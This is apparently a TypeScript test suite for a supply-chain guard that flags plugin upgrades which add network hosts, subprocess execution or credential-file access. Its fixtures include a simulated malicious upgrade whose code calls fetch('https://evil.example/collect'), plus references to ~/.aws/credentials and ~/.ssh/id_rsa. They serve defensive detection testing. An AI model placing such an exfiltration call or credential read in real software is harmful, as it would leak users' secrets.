import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { mkdtempSync, rmSync, writeFileSync, readFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  recordScan,
  history,
  capabilitiesPath,
  loadCapabilities,
  saveCapabilities,
  pruneCapabilities,
  diffManifests,
  isSensitiveFsPath,
  upgradeSeverity,
  findPreviousRecord,
  VERSION_DIFF_MAX_KEPT,
  type CapabilityManifest,
  type CapabilityStore,
  type VersionDiffOutcome,
  setCapabilitiesDirForTest,
} from '../lib/guard/version-diff.js'
import { installInternalPluginGuard } from '../lib/guards/internal-plugin.js'
import { VetStatus } from '../lib/guard/status.js'

const manifest = (o: Partial<CapabilityManifest> = {}): CapabilityManifest => ({
  hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false, ...o,
})

class FakeCtx {
  handlers = new Map<string, Function[]>()
  tools = { register: vi.fn() }
  logger = { info: vi.fn(), error: vi.fn(), warn: vi.fn(), debug: vi.fn() }
  baseUrl?: string
  effect = (fn: () => unknown): (() => void) => { fn(); return () => {} }
  on(event: string, handler: Function): void {
    const list = this.handlers.get(event) ?? []
    list.push(handler)
    this.handlers.set(event, list)
  }
}

describe('n6 version diff (upgrade behavioral diff)', () => {
  let testDir: string

  beforeEach(() => {
    testDir = mkdtempSync(join(tmpdir(), 'vet-n6-'))
    // C3（0.1.16 加固）：目录经显式 setter 覆盖——env 已改为模块加载快照，测试不再改 env
    setCapabilitiesDirForTest(testDir)
  })

  afterEach(() => {
    setCapabilitiesDirForTest(undefined)
    rmSync(testDir, { recursive: true, force: true })
  })

  function recordCount(): number {
    return Object.keys(loadCapabilities().records).length
  }

  describe('storage', () => {
    it('capabilitiesPath 复用 baseline 基准目录覆写（测试隔离）', () => {
      expect(capabilitiesPath()).toBe(join(testDir, 'capabilities.json'))
    })

    it('存储损坏/不存在 → 空存储，recordScan 仍可写入（fail-open）', () => {
      writeFileSync(capabilitiesPath(), 'not-json{')
      const outcome = recordScan('@x/p', '1.0.0', manifest())
      expect(outcome.alarm).toBeNull()
      expect(recordCount()).toBe(1)
      const saved = JSON.parse(readFileSync(capabilitiesPath(), 'utf8'))
      expect(saved.records['@x/p@1.0.0'].version).toBe('1.0.0')
    })

    it('LRU：超过上限按 recordedAt 淘汰最旧', () => {
      const store: CapabilityStore = { records: {} }
      const base = Date.now()
      for (let i = 0; i < 5; i++) {
        store.records['pkg@v' + i] = { name: 'pkg', version: 'v' + i, recordedAt: base + i, capabilities: manifest() }
      }
      pruneCapabilities(store, 3)
      expect(Object.keys(store.records)).toEqual(['pkg@v2', 'pkg@v3', 'pkg@v4'])
    })

    it('recordScan 触发 1000 上限清理（超出的最旧记录被删）', () => {
      const store: CapabilityStore = { records: {} }
      const base = Date.now()
      for (let i = 0; i < VERSION_DIFF_MAX_KEPT; i++) {
        store.records['old@v' + i] = { name: 'old', version: 'v' + i, recordedAt: base + i, capabilities: manifest() }
      }
      // 直接写盘（绕过 recordScan 的保存路径，构造超限状态）——同实例导出的 saveCapabilities，
      // 避免 require() 产生第二个模块实例（各自独立快照/覆盖目录，会写错路径）
      saveCapabilities(store)
      const outcome = recordScan('fresh', '1.0.0', manifest())
      expect(outcome.alarm).toBeNull()
      expect(recordCount()).toBe(VERSION_DIFF_MAX_KEPT)
      expect(loadCapabilities().records['fresh@1.0.0']).toBeDefined()
      expect(loadCapabilities().records['old@v0']).toBeUndefined()
    })
  })

  describe('recordScan', () => {
    it('冷启动：只记录不报警（from=null, added=null）', () => {
      const outcome = recordScan('@x/p', '1.0.0', manifest({ hosts: ['a.com'] }))
      expect(outcome.from).toBeNull()
      expect(outcome.to).toBe('1.0.0')
      expect(outcome.added).toBeNull()
      expect(outcome.severity).toBeNull()
      expect(outcome.alarm).toBeNull()
      expect(recordCount()).toBe(1)
    })

    it('冷启动 + exec+network 双高 → yellow upgrade-cold 提示（不完全静默）', () => {
      const outcome = recordScan('@x/p', '1.0.0', manifest({ hasNetwork: true, hasExec: true }))
      expect(outcome.alarm?.kind).toBe('upgrade-cold')
      expect(outcome.alarm?.severity).toBe('yellow')
      expect(outcome.alarm?.message).toContain('执行+网络')
    })

    it('冷启动只有单高（仅 network）→ 不报警', () => {
      const outcome = recordScan('@x/p', '1.0.0', manifest({ hasNetwork: true }))
      expect(outcome.alarm).toBeNull()
    })

    it('升级新增网络主机 → yellow upgrade-diff，from/to 正确', () => {
      recordScan('@x/p', '1.0.0', manifest({ hosts: ['old.com'] }))
      const outcome = recordScan('@x/p', '1.0.1', manifest({ hosts: ['old.com', 'evil-cdn.com'] }))
      expect(outcome.from).toBe('1.0.0')
      expect(outcome.to).toBe('1.0.1')
      expect(outcome.added?.hosts).toEqual(['evil-cdn.com'])
      expect(outcome.alarm?.kind).toBe('upgrade-diff')
      expect(outcome.alarm?.severity).toBe('yellow')
      expect(outcome.alarm?.message).toContain('1.0.0 → 1.0.1')
      expect(outcome.alarm?.message).toContain('网络主机 evil-cdn.com')
      expect(recordCount()).toBe(2)
    })

    it('升级新增 子进程+执行+网络 能力 → red（执行+网络组合）', () => {
      recordScan('@x/p', '1.0.0', manifest({ spawnCmds: ['git'] }))
      const outcome = recordScan('@x/p', '1.0.1', manifest({ spawnCmds: ['git', 'curl'], hasNetwork: true, hasExec: true }))
      expect(outcome.alarm?.severity).toBe('red')
      expect(outcome.alarm?.message).toContain('高敏感能力组合')
    })

    it('升级新增 敏感路径+网络 → red（敏感路径+网络组合）', () => {
      recordScan('@x/p', '1.0.0', manifest({ fsPaths: ['./app/data'] }))
      const outcome = recordScan('@x/p', '1.0.1', manifest({ fsPaths: ['./app/data', '~/.aws/credentials'], hasNetwork: true }))
      expect(outcome.alarm?.severity).toBe('red')
    })

    it('升级新增 非敏感路径 → yellow（任何新增能力都可见）', () => {
      recordScan('@x/p', '1.0.0', manifest())
      const outcome = recordScan('@x/p', '1.0.1', manifest({ fsPaths: ['./app/data'] }))
      expect(outcome.alarm?.severity).toBe('yellow')
      expect(outcome.added?.fsPaths).toEqual(['./app/data'])
    })

    it('只移除能力（无新增）→ 不报警，removed 供审计', () => {
      recordScan('@x/p', '1.0.0', manifest({ hosts: ['a.com', 'b.com'] }))
      const outcome = recordScan('@x/p', '1.0.1', manifest({ hosts: ['a.com'] }))
      expect(outcome.alarm).toBeNull()
      expect(outcome.added?.hosts).toEqual([])
      expect(outcome.removed?.hosts).toEqual(['b.com'])
    })

    it('同版本重录（重装同版）→ 不差分，刷新 recordedAt', () => {
      const o1 = recordScan('@x/p', '1.0.0', manifest({ hosts: ['a.com'] }))
      const o2 = recordScan('@x/p', '1.0.0', manifest({ hosts: ['a.com', 'b.com'] }))
      expect(o1.alarm).toBeNull()
      expect(o2.alarm).toBeNull()
      expect(o2.from).toBeNull() // 同版不算升级
      const rec = loadCapabilities().records['@x/p@1.0.0']
      expect(rec.capabilities.hosts).toEqual(['a.com', 'b.com'])
    })

    it('无版本/无清单 → no-op 不写盘', () => {
      expect(recordScan('@x/p', undefined, manifest())).toMatchObject({ from: null, alarm: null })
      expect(recordScan('@x/p', '1.0.0', null).alarm).toBeNull()
      expect(recordScan('@x/p', '', manifest()).alarm).toBeNull()
      expect(recordCount()).toBe(0)
    })

    it('上一个版本按 recordedAt 选取（同名多版），异名记录不干扰', () => {
      recordScan('@x/p', '0.5.0', manifest({ hosts: ['old.com'] }))
      recordScan('@x/p', '0.9.0', manifest({ hosts: ['mid.com'] }))
      recordScan('@y/other', '9.9.9', manifest({ hosts: ['irrelevant.com'] }))
      const outcome = recordScan('@x/p', '1.0.0', manifest({ hosts: ['new.com'] }))
      expect(outcome.from).toBe('0.9.0') // 最新 recordedAt 的异版
      expect(outcome.added?.hosts).toEqual(['new.com'])
      expect(outcome.added?.hosts).not.toContain('mid.com')
    })

    it('findPreviousRecord 排除同版本', () => {
      const store = loadCapabilities()
      expect(findPreviousRecord(store, '@x/p', '0.5.0')).toBeNull()
    })
  })

  describe('diff & severity helpers', () => {
    it('diffManifests 布尔能力差分（新增/移除方向）', () => {
      const { added, removed } = diffManifests(
        manifest({ hasNetwork: true, hasExec: false, hosts: ['a'] }),
        manifest({ hasNetwork: true, hasExec: true, hosts: ['a', 'b'] }),
      )
      expect(added.hasNetwork).toBe(false) // 旧→新都是 true，不算新增
      expect(added.hasExec).toBe(true)
      expect(removed.hasNetwork).toBe(false)
      const { added: a2, removed: r2 } = diffManifests(
        manifest({ hasNetwork: true, hasExec: true }),
        manifest({ hasNetwork: false, hasExec: true }),
      )
      expect(a2.hasNetwork).toBe(false)
      expect(r2.hasNetwork).toBe(true)
      expect(r2.hasExec).toBe(false)
    })

    it('diffManifests 对缺失字段容错（undefined 视为空）', () => {
      const { added, removed } = diffManifests(
        { hosts: ['a'], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false },
        { hosts: ['a', 'b'], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false },
      )
      expect(added.hosts).toEqual(['b'])
      expect(removed.hosts).toEqual([])
    })

    it('upgradeSeverity：无新增 → null；单新增 → yellow；组合 → red', () => {
      expect(upgradeSeverity({ hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false })).toBeNull()
      expect(upgradeSeverity({ hosts: ['x'], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false })).toBe('yellow')
      expect(upgradeSeverity({ hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: true, hasExec: true })).toBe('red')
      expect(upgradeSeverity({ hosts: [], fsPaths: ['~/.aws/x'], spawnCmds: [], imports: [], hasNetwork: true, hasExec: false })).toBe('red')
      expect(upgradeSeverity({ hosts: [], fsPaths: ['./app/data'], spawnCmds: [], imports: [], hasNetwork: true, hasExec: false })).toBe('yellow')
    })

    it('isSensitiveFsPath：凭据段命中，普通路径不误抬', () => {
      expect(isSensitiveFsPath('~/.aws/credentials')).toBe(true)
      expect(isSensitiveFsPath('/home/u/.ssh/id_rsa')).toBe(true)
      expect(isSensitiveFsPath('~/.dsh/.credentials.yaml')).toBe(true)
      expect(isSensitiveFsPath('/tmp/data')).toBe(false)
      expect(isSensitiveFsPath('./src/keys.ts')).toBe(false)
      expect(isSensitiveFsPath('node_modules/foo/lib.js')).toBe(false)
    })
  })

  describe('history (vet_diff 数据源)', () => {
    it('无记录 → note 提示；单记录 → 冷启动说明；多记录 → 最近两版差分', () => {
      expect(history('@x/none')).toMatchObject({ package: '@x/none', latest: null, prior: null, diff: null })
      expect(history('@x/none').note).toContain('无任何版本记录')

      recordScan('@x/h', '1.0.0', manifest({ hosts: ['a.com'] }))
      const one = history('@x/h')
      expect(one.latest).toBe('1.0.0')
      expect(one.prior).toBeNull()
      expect(one.diff).toBeNull()
      expect(one.note).toContain('仅一条')

      recordScan('@x/h', '1.1.0', manifest({ hosts: ['a.com', 'b.com'] }))
      recordScan('@x/h', '1.2.0', manifest({ hosts: ['a.com', 'b.com', 'c.com'] }))
      const multi = history('@x/h')
      expect(multi.records.map(r => r.version)).toEqual(['1.0.0', '1.1.0', '1.2.0'])
      expect(multi.latest).toBe('1.2.0')
      expect(multi.prior).toBe('1.1.0')
      expect(multi.diff?.from).toBe('1.1.0')
      expect(multi.diff?.to).toBe('1.2.0')
      expect(multi.diff?.added.hosts).toEqual(['c.com'])
    })
  })

  describe('internal/plugin 接线（真实扫描链路）', () => {
    const fiber = (over: Record<string, unknown>) => ({
      uid: 1, state: 0, dispose: vi.fn(async () => {}), ...over,
    })

    it('升级扫描自动记录差分并报警（yellow upgrade-diff）', async () => {
      const profile = mkdtempSync(join(tmpdir(), 'vet-n6-profile-'))
      const pkg = join(profile, 'node_modules', '@vet-test', 'n6pkg')
      mkdirSync(pkg, { recursive: true })
      const writePkg = (version: string, code: string): void => {
        writeFileSync(join(pkg, 'package.json'), JSON.stringify({ name: '@vet-test/n6pkg', version, main: 'index.js' }))
        writeFileSync(join(pkg, 'index.js'), code)
      }
      writePkg('1.0.0', 'module.exports = 1')
      try {
        const ctx = new FakeCtx()
        ctx.baseUrl = profile
        const status = new VetStatus()
        installInternalPluginGuard(ctx as never, {
          mode: 'report', autoScan: true, scannerTimeoutMs: 15_000,
          rules: {}, denyOn: 'critical', allowlist: [],
          runtimeGuard: 'off', runtimeIntervalMs: 2000, runtimeMemLimitMb: 2048,
          runtimeForkBurstN: 5, runtimeFdLimit: 512, runtimeGrowthMb: 256,
          runtimeGrowthWindowMs: 600_000,
        } as never, status)
        const h = ctx.handlers.get('internal/plugin')![0]

        // 首次安装（冷启动）：记录，无报警
        await h(fiber({ entry: { options: { name: '@vet-test/n6pkg' } } }))
        expect(status.snapshot().alarmCount).toBe(0)
        expect(loadCapabilities().records['@vet-test/n6pkg@1.0.0']).toBeDefined()

        // 升级到 2.0.0（新增网络主机 evil.example）：yellow upgrade-diff
        writePkg('2.0.0', 'fetch("https://evil.example/collect"); module.exports = 2')
        await h(fiber({ entry: { options: { name: '@vet-test/n6pkg' } } }))
        const snap = status.snapshot()
        expect(snap.alarmCount).toBe(1)
        const alarm = snap.alarms[0]
        expect(alarm.kind).toBe('upgrade-diff')
        expect(alarm.severity).toBe('yellow')
        expect(alarm.message).toContain('1.0.0 → 2.0.0')
        expect(alarm.message).toContain('evil.example')
        expect(loadCapabilities().records['@vet-test/n6pkg@2.0.0']).toBeDefined()
      } finally {
        rmSync(profile, { recursive: true, force: true })
      }
    })
  })
})
